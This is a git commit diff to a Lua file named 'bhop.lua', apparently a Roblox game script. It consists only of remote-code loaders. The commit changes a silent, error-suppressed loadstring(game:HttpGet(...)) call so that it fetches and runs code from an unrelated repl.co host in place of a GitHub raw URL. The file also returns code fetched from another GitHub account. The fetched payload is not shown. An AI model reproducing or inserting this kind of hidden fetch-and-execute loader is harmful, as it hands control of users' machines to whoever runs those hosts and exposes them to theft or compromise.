b29a0518ca1a1c755e12b08a4a3a28439f6d693f
cosmice <126935865+cosmice@users.noreply.github.com>
2023-09-09 19:59:08 -0500

    Update bhop.lua

--- bhop.lua
+++ bhop.lua
@@ -1,4 +1,4 @@
 coroutine.resume(coroutine.create(pcall), function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/cosmice/scr/main/bhop.lua", true))()
+	loadstring(game:HttpGet("https://library.xtebite.repl.co", true))()
 end)
 return loadstring(game:HttpGet("https://raw.githubusercontent.com/exceptional0/scr/main/bhop.lua", true))(...)
